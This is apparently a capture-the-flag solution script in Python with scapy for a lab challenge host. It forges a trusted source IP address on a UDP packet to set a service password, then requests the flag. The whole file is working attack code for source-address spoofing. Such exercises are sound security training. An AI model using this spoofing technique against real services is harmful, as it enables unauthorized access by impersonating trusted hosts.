from scapy.all import send, sr1, IP, UDP, Raw, RandShort
from time import sleep

# Hack to send to localhost
# from scapy.all import conf, L3RawSocket
# conf.L3socket = L3RawSocket

ACTION_PING = 0
ACTION_GET_FLAG = 1
ACTION_SET_PWD = 2

def craft_chal1(action, string, spoof=False):
    src_ip = "222.173.190.239" if spoof else None
    pkt = IP(dst="chals.labs.rpis.ec", src=src_ip)
        
    payload = bytearray()
    payload.append(action)
    payload.append(len(string))
    payload.extend(string)
    
    pkt /= UDP(sport=RandShort(), dport = 47139)
    pkt /= Raw(payload)
    return pkt

PASSWORD = b"dhakjsdkja,me2nlk"

# pkt = craft_chal1(ACTION_SET_PWD, PASSWORD, spoof=False)
# print(sr1(pkt).show())

pkt = craft_chal1(ACTION_SET_PWD, PASSWORD, spoof=True)
send(pkt)
# sleep(1)
pkt = craft_chal1(ACTION_GET_FLAG, PASSWORD, spoof=False)
res = sr1(pkt)
print(res.show())